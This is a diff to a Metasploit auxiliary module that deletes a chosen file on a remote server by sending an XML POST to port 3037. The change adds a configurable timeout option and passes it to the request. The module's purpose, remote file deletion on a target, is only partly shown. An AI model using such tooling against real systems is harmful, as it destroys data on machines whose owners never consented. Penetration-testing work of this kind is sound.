@@ -34,9 +34,14 @@ class Metasploit3 < Msf::Auxiliary
       register_options(
         [
           Opt::RPORT(3037),
-          OptBool.new('SSL', [true, 'Use SSL', true]),
+          OptBool.new('SSL', [ true, 'Use SSL', true ]),
           OptString.new('RPATH', [ true, "The remote file path to delete", "c:\\test.txt" ]),
+          OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 5 ])
         ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 5
   end
 
   def run
@@ -54,7 +59,7 @@ class Metasploit3 < Msf::Auxiliary
         'method'  => 'POST',
         'ctype'   => "text/xml",
         'data'    => message,
-      }, 5)
+      }, timeout)
 
     if res and res.code == 200 and res.body =~ /<RESULT><VERSION>1<\/VERSION><STATUS>0<\/STATUS><TRANSID>0<\/TRANSID><\/RESULT>/
       print_good("#{peer} - File #{datastore['RPATH']} successfully deleted")
